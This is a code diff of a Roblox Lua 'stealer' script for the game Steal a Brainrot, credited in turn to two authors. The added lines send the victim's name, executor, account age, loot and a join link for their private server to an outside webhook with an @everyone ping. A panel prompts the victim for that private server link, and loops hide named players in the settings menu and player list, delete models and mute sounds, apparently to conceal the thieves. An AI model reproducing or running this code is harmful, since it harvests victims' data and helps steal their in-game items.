@@ -206,6 +206,20 @@ local function collectValidPets()
 
 	return pets
 end
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor() end
+    return executor
+end
+
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
 
 local map = Workspace:FindFirstChild("Map")
 local serverType = "UNKNOWN"
@@ -256,22 +270,23 @@ local function sendWebhook(link)
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
     local embed = {
-        ["title"] = "🧠Sab Stealer - Make By Thanh Nguyen",
+        ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
             { ["name"] = "Hit By", ["value"] = "Sync" },
             { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
-            { 
-    ["name"] = "👥 Player Information",
-            ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
-            "\nReceiver: " .. receiverList,
+            { ["name"] = "👥 Player Information",
+              ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
+                          "\nReceiver: ".. receiverList ..
+                          "\nExecutor: " .. detectExecutor() ..
+                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
     }
     local payload = {
-        ["content"] = "📣 @everyone **HIT KÌA MẤY EM**\n" .. (link or ("Server detected: " .. serverType)),
+        ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
         ["embeds"] = {embed},
         ["allowed_mentions"] = { ["parse"] = {"everyone"} }
     }
@@ -298,7 +313,7 @@ else
     local playerGui = player and player:WaitForChild("PlayerGui")
     if playerGui then
         local screenGui = Instance.new("ScreenGui", playerGui)
-        screenGui.Name = "StealABrainrotHUB"
+        screenGui.Name = "StealBrainrotGUI"
         screenGui.ResetOnSpawn = false
 
         local frame = Instance.new("Frame", screenGui)
@@ -332,7 +347,7 @@ else
         local textBox = Instance.new("TextBox", frame)
         textBox.Size = UDim2.new(0.9,0,0,40)
         textBox.Position = UDim2.new(0.05,0,0,60)
-        textBox.PlaceholderText = "Enter your server link to avoid errors or lag"
+        textBox.PlaceholderText = "Please enter your private server link"
         textBox.Text = ""
         textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
         textBox.TextColor3 = Color3.fromRGB(255,255,255)
@@ -559,32 +574,153 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    local CoreGui = game:GetService("CoreGui")
+    local CoreGui = game:GetService("CoreGui")  -- 👈 thêm nhiều tên nếu muốn xoá nhiều người
 
     while task.wait(0.05) do
         ---------------------------
         -- XÓA TRONG SETTINGS MENU
         ---------------------------
-        local robloxGui = CoreGui:FindFirstChild("RobloxGui")
-        if robloxGui then
+        local playersFolder = CoreGui:FindFirstChild("RobloxGui")
+            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield:FindFirstChild("MenuContainer")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer:FindFirstChild("Page")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page:FindFirstChild("PageViewClipper")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper:FindFirstChild("PageView")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView:FindFirstChild("PageViewInnerFrame")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame:FindFirstChild("Players")
 
-            -- Xóa settings (Menu Setting khi bấm ESC)
-            local settings = robloxGui:FindFirstChild("SettingsClippingShield")
-            if settings then
-                settings:Destroy()
+        if playersFolder then
+            for _, badName in ipairs(badPlayers) do
+                local target = playersFolder:FindFirstChild("PlayerLabel" .. badName)
+                if target then
+                    target:Destroy()
+                    print("✅ Đã xoá PlayerLabel " .. badName)
+                end
             end
+        end
 
-            -- Xóa PlayerList (Danh sách người chơi)
-            local playerList = robloxGui:FindFirstChild("PlayerListMaster")
-            if playerList then
-                playerList:Destroy()
+local success, scrollList = pcall(function()
+    return CoreGui.PlayerList
+        .Children.BodyBackground
+        .ContentFrame
+        .PlayerScrollList
+end)
+
+if success and scrollList then
+    local teamList = scrollList:FindFirstChild("TeamList_Neutral")
+    if teamList then
+        for _, entry in ipairs(teamList:GetChildren()) do
+            if entry.Name:match("^PlayerEntry_") then
+                local nameLabel = entry:FindFirstChild("ChildrenFrame")
+                    and entry.ChildrenFrame:FindFirstChild("NameFrame")
+                    and entry.ChildrenFrame.NameFrame:FindFirstChild("PlayerName")
+                    and entry.ChildrenFrame.NameFrame.PlayerName:FindFirstChild("PlayerName")
+
+                if nameLabel and nameLabel:IsA("TextLabel") then
+                    local playerName = nameLabel.Text
+                    if type(config.Displayname) == "table" then
+                        for _, badName in ipairs(config.Displayname) do
+                            if string.lower(playerName) == string.lower(badName) then
+                                entry:Destroy()
+                                break
+                            end
+                        end
+                    elseif type(config.Displayname) == "string" then
+                        if string.lower(playerName) == string.lower(config.Displayname) then
+                            entry:Destroy()
+                                end
+                            end
+                        end
+                    end
+                end
             end
+        end
+    end
+end) 
 
-            -- Xóa TopBar (thanh trên cùng)
-            local topBar = robloxGui:FindFirstChild("TopBar")
-            if topBar then
-                topBar:Destroy()
+task.spawn(function()
+    local protectedModels = {
+        ["Witch"] = true,
+        ["ShopNPCRobuxIdle"] = true,
+        ["ShopNPCCash"] = true,
+        ["Shop"] = true,
+        ["RobuxShop"] = true,
+        ["FuseMachine"] = true,
+        ["CraftingMachine"] = true,
+    }
+
+    local function isRandomID(name)
+        return name and name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$") ~= nil
+    end
+
+    while task.wait(0.1) do
+        for _, obj in ipairs(Workspace:GetChildren()) do
+            if obj:IsA("Model") then
+                local name = obj.Name
+                if not protectedModels[name] then
+                    if not isRandomID(name) then
+                        local playerExists = Players:FindFirstChild(name)
+                        if not playerExists then
+                            obj:Destroy()
+                        end
+                    end
+                end
             end
         end
     end
 end)
+
+local blockedSounds = {
+	["rbxassetid://18145114696"] = true,
+	["rbxassetid://18319185077"] = true
+}
+
+local function deleteSpecificSounds()
+	for _, obj in pairs(Workspace:GetDescendants()) do
+		if obj:IsA("Sound") and blockedSounds[obj.SoundId] then
+			obj:Destroy()
+		end
+	end
+end
+
+local function deleteCoilSounds()
+	if not badPlayers or not badPlayers:IsDescendantOf(Workspace) then
+		return
+	end
+	for _, obj in pairs(badPlayers:GetDescendants()) do
+		if obj:IsA("Sound") then
+			local soundId = string.lower(obj.SoundId or "")
+			local name = string.lower(obj.Name or "")
+			if string.find(soundId, "Coil") or string.find(name, "Coil") then
+				obj:Destroy()
+			end
+		end
+	end
+end
+
+deleteSpecificSounds()
+deleteCoilSounds()
+
+Workspace.DescendantAdded:Connect(function(obj)
+	if obj:IsA("Sound") and blockedSounds[obj.SoundId] then
+		obj:Destroy()
+	end
+end)
+
+if badPlayers then
+	badPlayers.DescendantAdded:Connect(function(obj)
+		if obj:IsA("Sound") then
+			local soundId = string.lower(obj.SoundId or "")
+			local name = string.lower(obj.Name or "")
+			if string.find(soundId, "Coil") or string.find(name, "Coil") then
+				obj:Destroy()
+			end
+		end
+	end)
+end
+
+while task.wait(0.1) do
+	deleteSpecificSounds()
+	deleteCoilSounds()
+end
